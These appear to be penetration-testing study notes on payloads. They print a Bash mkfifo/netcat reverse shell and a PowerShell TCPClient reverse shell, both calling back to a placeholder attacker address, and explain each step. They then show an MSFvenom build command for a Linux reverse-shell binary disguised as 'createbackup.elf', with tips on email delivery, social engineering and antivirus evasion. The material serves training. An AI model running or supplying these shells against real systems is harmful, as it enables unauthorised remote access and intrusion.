# Payloads

The terms "malware" and "malicious code" romanticize the process and make it more mysterious than it is. Any time we work with payloads, let's challenge ourselves to explore what the code & commands are actually doing

### One-Liners Examined

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> 7777 > /tmp/f
```

`rm -f /tmp/f;` Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially

`mkfifo /tmp/f;` Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified

`cat /tmp/f |` Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe

`/bin/bash -i 2>&1 |` Specifies the interpreter using the `-i` option for interactive. `2>&1` ensures the standard error data stream (`2`) and standard output data stream (`1`) are redirected to the command following the pipe

`nc <ip> 7777 > /tmp/f`  Sends Netcat connection. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

`powershell -nop -c` Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. Its good to know this if we discover RCE that allows us to execute in cmd.exe

`"$client = New-Object System.Net.Sockets.TCPClient(<ip>,443);` Sets $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses

`$stream = $client.GetStream();` Sets `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications

`[byte[]]$bytes = 0..65535|%{0};` Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection

`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method

`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);` Sets `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text

`$sendback = (iex $data 2>&1 | Out-String );`&#x20;

## Crafting Payloads with MSFvenom

There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use `MSFvenom` to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file

MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures.

This command lists all available payloads:

```shell-session
msfvenom -l payloads
```

### Staged vs Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. Example would be a reverse tcp shell, where it sends a small "stage" that executes on the target and calls back to download the temainder of the payload

`Stageless` payloads do not have a stage sent. These are better in environments where we have little bandwidth or a lot of latency

### Build a Stagless Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
